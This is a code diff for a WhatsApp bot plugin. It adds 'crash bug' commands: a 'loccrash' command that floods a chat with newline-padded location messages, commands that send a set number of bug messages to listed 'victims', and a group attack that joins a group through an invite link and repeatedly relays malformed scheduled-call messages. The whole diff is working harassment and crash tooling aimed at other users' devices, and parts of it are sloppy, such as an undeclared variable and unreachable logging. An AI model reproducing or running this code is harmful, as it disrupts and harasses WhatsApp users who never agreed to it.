@@ -210,6 +210,35 @@ zokou(
     }
 );
 
+//loccrash
+zokou(
+    {
+      nomCom: 'loccrash',
+      reaction: '\uD83D\uDD16',
+      categorie: category
+    },
+    
+    async (dest, zk, commandOptions) => {
+      const { ms, arg, repondre, superUser} = commandOptions;
+      if (!superUser)
+        return await repondre(mess.prem);
+      await loading(dest, zk);
+      
+      for (let i = 0; i < 20; i++){
+        for(let j = 0;j < '3';j++) {
+          zk.sendMessage(dest, {
+            location: {
+            degreesLatitude: -6.28282828,
+            degreesLongitude: -1.2828,
+            name: 'BRUX0N3RD\n\n\n\n\n\n\n\n',
+          }
+          }, { quoted: ms});
+        }
+      }
+      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
+    }
+);
+
 //crashbug
 zokou(
   {
@@ -274,35 +303,6 @@ zokou(
     await react(dest, zk, ms, '✅');
   }
   );
-
-//loccrash
-zokou(
-    {
-      nomCom: 'loccrash',
-      reaction: '\uD83D\uDD16',
-      categorie: category
-    },
-    
-    async (dest, zk, commandOptions) => {
-      const { ms, arg, repondre, superUser} = commandOptions;
-      if (!superUser)
-        return await repondre(mess.prem);
-      await loading(dest, zk);
-      
-      for (let i = 0; i < 20; i++){
-        for(let j = 0;j < '3';j++) {
-          zk.sendMessage(dest, {
-            location: {
-            degreesLatitude: -6.28282828,
-            degreesLongitude: -1.2828,
-            name: 'BRUX0N3RD\n\n\n\n\n\n\n\n',
-          }
-          }, { quoted: ms});
-        }
-      }
-      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
-    }
-);
   
 // amountbug
 zokou(
@@ -381,7 +381,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -440,7 +440,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -499,7 +499,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -558,7 +558,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -617,7 +617,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -676,7 +676,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -741,7 +741,7 @@ zokou(
       }
     } else {
       amount = parseInt(text.split('|')[0].trim());
-      if (isNaN(amount)){
+      if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
@@ -783,24 +783,55 @@ zokou(
     await loading(dest, zk);
     let amoumt = 30;
     let link = '';
-    let bug = {};
+    let bug =   {
+      "scheduledCallCreationMessage": {
+        "callType": "2",
+        "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+        "title": `${bugtext1}`,
+      }
+    };
     
     if (arg.length === 1) {
       if (whatsappRegex.test(arg[0])){
-        link = args[0].split('https://chat.whatsapp.com/')[1]
+        link = args[0].split('https://chat.whatsapp.com/')[1];
+        try {
+          gc = zk.groupAcceptInvite(link);
+        } catch(e) {
+          return await repondre(`something went wrong`)
+          console.log(`something went wrong : ${e}`)
+        }
       } else {
-        return await repondre(`${link} is not a valid group link`)
+        return await repondre(`${link} is not a valid group link`);
       }
     } else {
-      amount = parseInt(arg.join('').split('|')[0].trim())
+      amount = parseInt(arg.join('').split('|')[0].trim());
       if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1){
         return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
       } else {
         if (whatsappRegex.test(arg.join('').split('|')[1])){
-        link = arg.join('').split('|')[1].split('https://chat.whatsapp.com/')[1]
+        link = arg.join('').split('|')[1].split('https://chat.whatsapp.com/')[1];
+        try {
+          gc = zk.groupAcceptInvite(link);
+        } catch(e) {
+          return await repondre(`something went wrong`)
+          console.log(`something went wrong : ${e}`)
+        }
+        } else {
+          return await repondre(`${link} is not a valid group link`);
         }
       }
     }
     //send bug
+    for (let i = 0; i < amount; i++){
+      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject(bug), { userJid: dest, quoted : ms});
+        try {
+            zk.relayMessage(gc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            repondre(`An error occured while sending bugs to ${'https://chat.whatsapp.com' + link}`);
+            console.log(`An error occured while sending bugs to ${link}: ${e}`);
+            break;
+        }
+        await delay(3000);
+    }
   }
 );
